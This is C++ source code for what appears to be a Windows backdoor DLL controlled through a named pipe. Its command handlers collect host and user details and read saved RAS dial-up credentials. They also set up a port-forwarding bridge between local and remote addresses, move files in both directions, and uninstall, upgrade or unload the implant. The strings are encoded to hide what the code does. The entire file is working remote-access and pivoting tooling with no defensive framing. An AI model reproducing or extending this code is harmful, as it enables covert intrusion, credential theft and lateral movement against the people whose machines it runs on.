
BOOL RasInfoEntry(HANDLE hPipe, LPSTR lpRasEntryName){
	LPRASDIALPARAMSA lpRasDialParams = new RASDIALPARAMSA;
	LPRASENTRYA lpRasEntry = new RASENTRYA;
	DWORD ret, dwLenRasEntry;
	BOOL PasswordSave, boolRetVal;
	LPSTR msg = new CHAR[2048];
	DecodeString ds;
	
	if (!lpRasEntryName){
		#ifdef DEBUG_SHOW_ERROR
		CHAR msg[256]={0};
		/*sprintf(msg, "%d - %s", ds.length(), 
			ds.getDecodeString((LPSTR)encStr_Error_no_entry_name));
		MessageBox(0, msg, NULL, NULL);*/
		#endif

		WriteToPipe(hPipe, ds.length(), 
			ds.getDecodeString((LPSTR)encStr_Error_no_entry_name), FLAG_ERROR);
		boolRetVal=FALSE;
		goto Cleanup;
	}

	if (!strlen(lpRasEntryName)){
		WriteToPipe(hPipe, ds.length(), 
			ds.getDecodeString((LPSTR)encStr_Error_no_entry_name), FLAG_ERROR);
		boolRetVal=FALSE;
		goto Cleanup;
	}

	lpRasDialParams->dwSize = sizeof(RASDIALPARAMS);
	strcpy(lpRasDialParams->szEntryName, lpRasEntryName);
	if((ret = RasGetEntryDialParams(NULL, lpRasDialParams, &PasswordSave))){
		RasGetErrorString(ret, msg, 512);
		WriteToPipe(hPipe, strlen(msg), msg, FLAG_ERROR);
		boolRetVal=FALSE;
		goto Cleanup;
	}
	
	lpRasEntry->dwSize = sizeof(RASENTRY);
	dwLenRasEntry = sizeof(RASENTRY);
	if((ret = RasGetEntryProperties(NULL, lpRasEntryName, 
	lpRasEntry, &dwLenRasEntry, NULL, NULL))){
		RasGetErrorString(ret, msg, 512);
		WriteToPipe(hPipe, strlen(msg), msg, FLAG_ERROR);
		boolRetVal=FALSE;
		goto Cleanup;
	}

	sprintf(msg, ds.getDecodeString((LPSTR)encStr_Username_Domain_PhoneNumber_Etc),
		lpRasDialParams->szUserName, lpRasDialParams->szDomain, lpRasEntry->szLocalPhoneNumber);

	WriteToPipe(hPipe, strlen(msg), msg, NULL);

Cleanup:
	if(msg)
		delete[] msg;

	if(lpRasDialParams)
		delete lpRasDialParams;

	if(lpRasEntry)
		delete lpRasEntry;

	return boolRetVal;
}

DWORD Macro_GetInfo(HANDLE hPipe, LPSTR lpEntryName){
	CHAR procPath[MAX_PATH+4]={0};
	CHAR modPath[MAX_PATH+4]={0};
	LPSTR msg = new CHAR[512];
	DWORD nb_userName = 256, nb_computerName = 256;
	LPSTR userName = new CHAR[nb_userName];
	LPSTR computerName = new CHAR[nb_computerName];
	DecodeString ds;

	if(!GetModuleFileName(NULL, procPath, MAX_PATH)){
		WriteToPipe(hPipe, ds.length(), 
			ds.getDecodeString((LPSTR)encStr_Error_macro_get_info), FLAG_ERROR);
		goto Cleanup;
	}

	if(!GetModuleFileNameEx(GetCurrentProcess(), hInstance, modPath, MAX_PATH)){
		WriteToPipe(hPipe, ds.length(), 
			ds.getDecodeString((LPSTR)encStr_Error_macro_get_info), FLAG_ERROR);
		goto Cleanup;
	}

	memset(userName, 0, nb_userName);
	if(!GetUserName(userName, &nb_userName))
		sprintf(userName, "Unknow");
	
	memset(computerName, 0, nb_computerName);
	if(!GetComputerName(computerName, &nb_computerName))
		sprintf(computerName, "Unknow");

	/*sprintf(msg, "Computer name: %s\r\nUser: %s\r\nProc path: %s\r\nModule path: %s\r\nPID: %u\r\nCurrent path: %s\r\nExec app timeout: %d ms\r\n", 
		computerName, userName, procPath, modPath, GetCurrentProcessId(), procSIPath, WaitTimeOutExecuteApp);*/
	
	sprintf(msg, ds.getDecodeString((LPSTR)encStr_Computer_name), computerName);
	WriteToPipe(hPipe, strlen(msg), msg, FLAG_MORE_DATA);

	sprintf(msg, ds.getDecodeString((LPSTR)encStr_User), userName);
	WriteToPipe(hPipe, strlen(msg), msg, FLAG_MORE_DATA);

	sprintf(msg, ds.getDecodeString((LPSTR)encStr_Proc_path), procPath);
	WriteToPipe(hPipe, strlen(msg), msg, FLAG_MORE_DATA);
	
	sprintf(msg, ds.getDecodeString((LPSTR)encStr_Module_path), modPath);
	WriteToPipe(hPipe, strlen(msg), msg, FLAG_MORE_DATA);

	sprintf(msg, ds.getDecodeString((LPSTR)encStr_PID), GetCurrentProcessId());
	WriteToPipe(hPipe, strlen(msg), msg, FLAG_MORE_DATA);

	sprintf(msg, ds.getDecodeString((LPSTR)encStr_Current_path), procSIPath);
	WriteToPipe(hPipe, strlen(msg), msg, FLAG_MORE_DATA);

	sprintf(msg, ds.getDecodeString((LPSTR)encStr_Exec_app_timeout), WaitTimeOutExecuteApp);
	WriteToPipe(hPipe, strlen(msg), msg, FLAG_MORE_DATA);

	RasInfoEntry(hPipe, lpEntryName);

Cleanup:
	if (msg) 
		delete[] msg;
	if (userName)
		delete[] userName;
	if (computerName)
		delete[] computerName;

	return TRUE;
}


DWORD Macro_SetTimeOut(HANDLE hPipe, LPSTR lpszWaitTimeout){
	int tmp;
	CHAR msg[256]={0};
	DecodeString ds;

	if(!strlen(lpszWaitTimeout)){
		WriteToPipe(hPipe, ds.length(), ds.getDecodeString((LPSTR)encStr_Missing_parameters), FLAG_ERROR);
		return FALSE;
	}
	
	if(!(tmp = atoi(lpszWaitTimeout))){
		WriteToPipe(hPipe, ds.length(), ds.getDecodeString((LPSTR)encStr_Invalid_parameter), FLAG_ERROR);
		return FALSE;
	}
	
	WaitTimeOutExecuteApp = tmp;

	WriteToPipe(hPipe, ds.length(), ds.getDecodeString((LPSTR)encStr_Ok_set_timeout), NULL);
	return TRUE;
}


DWORD Macro_SetCD(HANDLE hPipe, LPSTR lpPath){
	CHAR msg[256]={0};
	DecodeString ds;

	if(!strlen(lpPath)){
		WriteToPipe(hPipe, ds.length(), ds.getDecodeString((LPSTR)encStr_Missing_parameters), FLAG_ERROR);
		return FALSE;
	}

	strncpy(procSIPath, lpPath, MAX_PATH);
	WriteToPipe(hPipe, ds.length(), ds.getDecodeString((LPSTR)encStr_Ok_set_current_dir), NULL);
	return TRUE;
}


DWORD Macro_EnableBridged(HANDLE hPipe){
	DWORD ThId;
	CHAR msg[256] = {0};
	int i;
	DecodeString ds;

	if(isActiveBridged){
		WriteToPipe(hPipe, ds.length(), ds.getDecodeString((LPSTR)encStr_No_necesary_bridged_is_up), FLAG_ERROR);
		return FALSE;
	}

	if(dwLenArrayCmdLine < 6){
		WriteToPipe(hPipe, ds.length(), ds.getDecodeString((LPSTR)encStr_Missing_parameters), FLAG_ERROR);
		return FALSE;
	}

	bridgeParams.localip = new CHAR[strlen(lpArrayCmdLine[1])+2];
	strcpy(bridgeParams.localip, lpArrayCmdLine[1]);

	bridgeParams.localport = atoi(lpArrayCmdLine[2]);
	
	bridgeParams.remoteip = new CHAR[strlen(lpArrayCmdLine[3])+2];
	strcpy(bridgeParams.remoteip, lpArrayCmdLine[3]);

	bridgeParams.remoteport = atoi(lpArrayCmdLine[4]);
	
	bridgeParams.narrayAcceptRemoteIPFDQN = dwLenArrayCmdLine - 5;
	bridgeParams.arrayAcceptRemoteIPFDQN = new LPSTR[dwLenArrayCmdLine - 5];	
	for(i=5; i<= dwLenArrayCmdLine-1; ++i){
		bridgeParams.arrayAcceptRemoteIPFDQN[i-5] = new CHAR[strlen(lpArrayCmdLine[i])+2];
		strcpy(bridgeParams.arrayAcceptRemoteIPFDQN[i-5], lpArrayCmdLine[i]);
	}

	hThreadBridged = CreateThread(0,0,(LPTHREAD_START_ROUTINE)thread_init_bridged,(LPVOID)&bridgeParams,0,&ThId);
	if(hThreadBridged == NULL){
		if ( bridgeParams.arrayAcceptRemoteIPFDQN ){
			for(i=0; i<= bridgeParams.narrayAcceptRemoteIPFDQN - 1; ++i){
				if ( bridgeParams.arrayAcceptRemoteIPFDQN[i] )
					delete[] bridgeParams.arrayAcceptRemoteIPFDQN[i];
			}
		}
		isActiveBridged = FALSE;
		sprintf(msg, ds.getDecodeString((LPSTR)encStr_Error_init_bridged), GetLastError());
		WriteToPipe(hPipe, strlen(msg), msg, FLAG_ERROR);
		return FALSE;
	}

	isActiveBridged = TRUE;
	WriteToPipe(hPipe, ds.length(), ds.getDecodeString((LPSTR)encStr_Bridged_initizalized), NULL);
	return TRUE;
}

DWORD Macro_DisableBridged(HANDLE hPipe){
	CHAR msg[256] = {0};
	int i;
	DWORD dwRetVal=FALSE;
	DecodeString ds;

	if(!isActiveBridged){
		WriteToPipe(hPipe, ds.length(), ds.getDecodeString((LPSTR)encStr_No_necesary_bridged_is_down), FLAG_ERROR);
		dwRetVal = FALSE;
		goto Cleanup;
	}
	
	if(!create_bridged_unload_mutex()){
		sprintf(msg, ds.getDecodeString((LPSTR)encStr_Error_creating_bridged_unload_mutex), GetLastError());
		WriteToPipe(hPipe, strlen(msg), msg, FLAG_ERROR);
		dwRetVal = FALSE;
		goto Cleanup;
	}

	switch(WaitForSingleObject(hThreadBridged, 4000)){
	case WAIT_OBJECT_0:
		isActiveBridged = FALSE;
		logger.empty();
		CloseHandle(hThreadBridged);

		WriteToPipe(hPipe, ds.length(), ds.getDecodeString((LPSTR)encStr_Unload_bridged_ok), NULL);
		break;
	case WAIT_TIMEOUT:
		isActiveBridged = TRUE;
		CloseHandle(hThreadBridged);

		WriteToPipe(hPipe, ds.length(), ds.getDecodeString((LPSTR)encStr_Timeout_unload_bridged), FLAG_ERROR);
		dwRetVal = FALSE;
		goto Cleanup;
		break;
	}

Cleanup:
	if ( bridgeParams.arrayAcceptRemoteIPFDQN ){
		for(i=0; i<= bridgeParams.narrayAcceptRemoteIPFDQN-1; ++i){
			if ( bridgeParams.arrayAcceptRemoteIPFDQN[i] )
				delete[] bridgeParams.arrayAcceptRemoteIPFDQN[i];
		}
		bridgeParams.arrayAcceptRemoteIPFDQN = NULL;
	}
	return TRUE;
}

DWORD Macro_GetBridgedLogs(HANDLE hPipe){
	CHAR msg[256] = {0};
	LPSTR tmp;
	DecodeString ds;

	if( logger.size() /*&& isActiveBridged*/ ){
		/*sprintf(msg, "\r\n");
		WriteToPipe(hPipe, strlen(msg), msg, FLAG_MORE_DATA);*/
		while(logger.size()){
			if(!(tmp = pop_log_record()))
				break;
			
			sprintf(msg, "%s\r\n", tmp);
			WriteToPipe(hPipe, strlen(msg), msg, FLAG_MORE_DATA);
			delete[] tmp;
		}
		WriteToPipe(hPipe, 0, "", NULL);
	}
	else{
		WriteToPipe(hPipe, ds.length(), ds.getDecodeString((LPSTR)encStr_Empty_logs_or_bridged_is_down), NULL);
	}
	return TRUE;
}

DWORD Macro_Unistall(HANDLE hPipe){
	CHAR msg[256] = {0};
	DecodeString ds;

	if(dwLenArrayCmdLine < 2){
		WriteToPipe(hPipe, ds.length(), ds.getDecodeString((LPSTR)encStr_Missing_parameters), FLAG_ERROR);
		return FALSE;
	}

	if(strstr(lpArrayCmdLine[1], "false"))
		UnistallProc(FALSE, FALSE);
	else
		UnistallProc(TRUE, FALSE);

	return TRUE;
}


DWORD Macro_RecvFile(HANDLE hPipe, LPSP_PACKET lpFirtsPacket){
	HANDLE hFile=NULL;
	LPSP_PACKET lpPacket=NULL, lpACKPacket=NULL;
	CHAR msg[256] = {0};
	DWORD nbWriten, dwRetVal;
	BOOL boolDeleteFile=FALSE;
	DecodeString ds;

	if(!lpFirtsPacket)
		return FALSE;

	if(!strlen((LPSTR)lpFirtsPacket->lpParam2)){
		WriteToPipe(hPipe, ds.length(), ds.getDecodeString((LPSTR)encStr_No_destination_especifiqued), FLAG_ERROR);
		return FALSE;
	}

	if((hFile = CreateFile((LPSTR)lpFirtsPacket->lpParam2, MAXIMUM_ALLOWED, NULL, NULL, 
		CREATE_NEW, NULL, NULL)) == INVALID_HANDLE_VALUE){

		sprintf(msg, ds.getDecodeString((LPSTR)encStr_Error_creating_file), GetLastError());
		WriteToPipe(hPipe, strlen(msg), msg, FLAG_ERROR);
		return FALSE;
	}

	if(!WriteFile(hFile, lpFirtsPacket->lpData, lpFirtsPacket->dwDataLen, &nbWriten, NULL)){
		sprintf(msg, ds.getDecodeString((LPSTR)encStr_Error_writing_file), GetLastError());
		WriteToPipe(hPipe, strlen(msg), msg, FLAG_ERROR);
		dwRetVal=FALSE;
		boolDeleteFile=TRUE;
		goto Cleanup;
	}
	
	//ACK
	if(lpACKPacket) FreePackage(lpACKPacket);
	if(!(lpACKPacket = InitializePackage(NULL, NULL, NULL, NULL, NULL, NULL, NULL))){
		dwRetVal=FALSE;
		boolDeleteFile=TRUE;
		goto Cleanup;
	}

	if(!WritePacketToPipe(hPipe, lpACKPacket)){
		dwRetVal=FALSE;
		boolDeleteFile=TRUE;
		goto Cleanup;
	}
	//---------------------------------------------------------------------------------

	if(lpFirtsPacket->dwFlags & FLAG_MORE_DATA){
		do{
			if(lpPacket)
				FreePackage(lpPacket);

			if(!(lpPacket = ReadPacketFromPipe(hPipe))){
				dwRetVal=FALSE;
				boolDeleteFile=TRUE;
				goto Cleanup;
			}
			
			if(!WriteFile(hFile, lpPacket->lpData, lpPacket->dwDataLen, &nbWriten, NULL)){
				sprintf(msg, ds.getDecodeString((LPSTR)encStr_Error_writing_file), GetLastError());
				WriteToPipe(hPipe, strlen(msg), msg, FLAG_ERROR);
				dwRetVal=FALSE;
				boolDeleteFile=TRUE;
				goto Cleanup;
			}

			//ACK
			if(lpACKPacket) FreePackage(lpACKPacket);
			if(!(lpACKPacket = InitializePackage(NULL, NULL, NULL, NULL, NULL, NULL, NULL))){
				dwRetVal=FALSE;
				boolDeleteFile=TRUE;
				goto Cleanup;
			}
			if(!WritePacketToPipe(hPipe, lpACKPacket)){
				dwRetVal=FALSE;
				boolDeleteFile=TRUE;
				goto Cleanup;
			}
			//---------------------------------------------------------------------------------
		}while(lpPacket->dwFlags & FLAG_MORE_DATA);
	}
	WriteToPipe(hPipe, ds.length(), ds.getDecodeString((LPSTR)encStr_File_uploaded), NULL);

Cleanup:
	if(hFile)
		CloseHandle(hFile);

	if(boolDeleteFile)
		DeleteFile((LPCTSTR)lpFirtsPacket->lpParam2);

	if(lpPacket)
		FreePackage(lpPacket);

	if(lpACKPacket) 
		FreePackage(lpACKPacket);	
	
	return dwRetVal;
}

DWORD Macro_SendFile(HANDLE hPipe, LPSP_PACKET lpFirtsPacket){
	HANDLE hFile=NULL;
	LPSP_PACKET lpPacket=NULL;
	CHAR msg[MAX_PATH] = {0};
	DWORD dwRetVal, nbReads, nbTotalRead=0, dwFileSize=NULL;
	LPSTR lpBuffer = new CHAR[BUFFER_SEND_FILE]; //10MB
	DecodeString ds;

	if(!lpBuffer){
		WriteToPipe(hPipe, ds.length(), ds.getDecodeString((LPSTR)encStr_No_enough_memory), FLAG_ERROR);
	}

	if(!lpFirtsPacket)
		return FALSE;

	if(!strlen((LPSTR)lpFirtsPacket->lpParam1)){
		WriteToPipe(hPipe, ds.length(), ds.getDecodeString((LPSTR)encStr_No_destination_especifiqued), FLAG_ERROR);
		return FALSE;
	}

	if((hFile = CreateFile((LPSTR)lpFirtsPacket->lpParam1, MAXIMUM_ALLOWED, 
		FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 
		NULL, NULL)) == INVALID_HANDLE_VALUE){
		
		sprintf(msg, ds.getDecodeString((LPSTR)encStr_Error_opening_file), GetLastError());
		WriteToPipe(hPipe, strlen(msg), msg, FLAG_ERROR);
		return FALSE;
	}

	/*if(!(dwFileSize = GetFileSize(hFile, NULL)) == INVALID_FILE_SIZE){
		sprintf(msg, "Error getting file size: %u", GetLastError());
		WriteToPipe(hPipe, msg, strlen(msg)+1, FLAG_ERROR);
		return FALSE;
	}*/

	do{
		if(!ReadFile(hFile, lpBuffer, BUFFER_SEND_FILE, &nbReads, NULL)){
			sprintf(msg, ds.getDecodeString((LPSTR)encStr_Error_reading_file), GetLastError());
			WriteToPipe(hPipe, strlen(msg), msg, FLAG_ERROR);
			return FALSE;
		}
		
		if(nbReads){
			if(!WriteToPipe(hPipe, nbReads, lpBuffer, FLAG_MORE_DATA)){
				dwRetVal = FALSE;
				goto Cleanup;
			}

			/*if(!(lpPacket = ReadPacketFromPipe(hPipe))){
				dwRetVal = FALSE;
				goto Cleanup;
			}

			if((lpPacket->dwFlags & FLAG_ERROR)){
				FreePackage(lpPacket);
				dwRetVal = FALSE;
				goto Cleanup;
			}
			else{
				FreePackage(lpPacket);
			}*/
		}
	}while(nbReads);
	WriteToPipe(hPipe, NULL, 0, NULL);

Cleanup:
	if(hFile)
		CloseHandle(hFile);

	if(lpBuffer)
		delete[] lpBuffer;

	return dwRetVal;
}

DWORD Macro_ProcSwitcher(HANDLE hPipe){
	CHAR msg[256]={0};
	HANDLE hMutex=NULL;
	DWORD dwCounter=0;
	DecodeString ds;

	if(!Macro_DisableBridged(NULL))
		TerminateThread(hThreadBridged, 0);
	hThreadBridged = NULL;

	TerminateThread(hThreadMonitor, 0);
	CloseHandle(hThreadMonitor);
	hThreadMonitor = NULL;

	WriteToPipe(hPipe, ds.length(), ds.getDecodeString((LPSTR)encStr_Switching), NULL);
	FlushFileBuffers(hPipe);
	DisconnectNamedPipe(hPipe);
	CloseHandle(hPipe);

	ReleaseMutex(hWorkingMutex);
	CloseHandle(hWorkingMutex);

	ReleaseMutex(hUnloadMutex);
	CloseHandle(hUnloadMutex);

	if(WaitAndCheckUnloadMutex(60, 1000))
		UnloadDLL();

	return TRUE;
}

DWORD Macro_Upgrade(HANDLE hPipe, LPCSTR fpOrig){
	DecodeString ds;
	
	if(!PathFileExists(fpOrig)){
		WriteToPipe(hPipe, ds.length(), ds.getDecodeString((LPSTR)encStr_The_file_for_upgrade_no_exists), FLAG_ERROR);
		return FALSE;
	}
	strcpy(FILE_ORIG_UPGRADE, fpOrig);
	
	WriteToPipe(hPipe, ds.length(), ds.getDecodeString((LPSTR)encStr_Upgrading), NULL);

	ACTIVE_UNISTALL_PROC_BY_DEMAND = TRUE;
	ACTIVE_UNISTALL_PROC_BY_DEMAND_REMOTE = FALSE;
	ACTIVE_UNISTALL_PROC_BY_DEMAND_UPGRADE = TRUE;

	return TRUE;
}